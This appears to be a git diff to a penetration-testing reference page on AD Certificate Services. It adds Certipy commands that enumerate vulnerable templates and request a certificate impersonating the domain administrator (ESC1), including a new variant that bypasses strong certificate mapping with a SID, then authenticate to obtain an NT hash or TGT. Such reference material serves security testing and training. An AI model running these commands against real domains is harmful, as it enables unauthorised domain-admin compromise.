@@ -1,6 +1,6 @@
 ---
 title: "AD Certificate Services: Quick Reference"
-sidebarTitle: "AD CS and certificates"
+sidebarTitle: "ADCS (ESC1–ESC13)"
 description: "Review Certipy enumeration and the saved ESC1 certificate request and authentication examples."
 keywords: ["adcs", "ad cs", "certipy", "esc1", "certificate templates", "pkinit", "esc8"]
 boost: 2
@@ -18,7 +18,7 @@ import { TargetContextBar } from "/snippets/target-context-bar.jsx";
 
 ## Qualify the certificate finding before choosing a recipe
 
-**Correction to the preserved notes:** ESC1–ESC8 are not all certificate-template problems, and they do not all let any low-privileged user authenticate as anyone. ESC1 concerns a combination of template/enrollment conditions. ESC8 concerns NTLM relay to web enrollment. Treat each label as a different hypothesis with its own prerequisites. The older summary and worked commands remain below for provenance, not as current universal guidance.
+ESC1–ESC8 represent distinct ADCS misconfigurations rather than a single certificate-template bug: for example, **ESC1** requires a specific combination of enrollment rights, client-authentication EKU, and requester-supplied SAN/identity fields, whereas **ESC8** abuses NTLM relay to HTTP web enrollment. Treat each ESC label as a separate hypothesis and verify all prerequisites before requesting or relaying a certificate.
 
 ### Collect the complete configuration first
 
@@ -79,9 +79,11 @@ certipy auth -pfx lab-certificate.pfx -dc-ip DC_IP
 klist
 ```
 
-Inspect the actual tool output and resulting cache location. Certificate mapping, account state, KDC certificate/PKINIT support, time and trust can all affect authentication. Newer strong-mapping enforcement can invalidate assumptions from older lab examples.
+Inspect the actual tool output and resulting cache location. Certificate mapping, account state, KDC certificate/PKINIT support, time and trust can all affect authentication. On patched Domain Controllers enforcing strong certificate mapping (`StrongCertificateBindingEnforcement` / KB5014754), include `-sid <TARGET_USER_SID>` when requesting an ESC1 certificate so the `szOID_NTDS_CA_SECURITY_EXT` SID extension matches the target account.
 
-Misconfigured certificate templates (ESC1–ESC8) let low-priv users obtain certs that authenticate as anyone. Enumerate with Certipy.
+### Quick ESC1 & ESC8 worked syntax
+
+Enumerate ADCS CAs and vulnerable templates from Kali with Certipy:
 
 ```bash
 # find vulnerable templates
@@ -91,8 +93,10 @@ certipy find -u USER@$DOMAIN -p PASS -dc-ip $DC -vulnerable -stdout
 ## ESC1 — template allows SAN + client auth
 
 ```bash
-# request a cert AS the domain admin
+# request a cert AS the domain admin (add -sid S-1-5-21-...-500 when strong certificate mapping is enforced)
 certipy req -u USER@$DOMAIN -p PASS -ca CA-NAME -template VulnTemplate -upn administrator@$DOMAIN -dc-ip $DC
+# strong-mapping variant with target SID:
+certipy req -u USER@$DOMAIN -p PASS -ca CA-NAME -template VulnTemplate -upn administrator@$DOMAIN -sid S-1-5-21-DOMAIN-500 -dc-ip $DC
 # authenticate with the cert -> get NT hash / TGT
 certipy auth -pfx administrator.pfx -dc-ip $DC
 ```
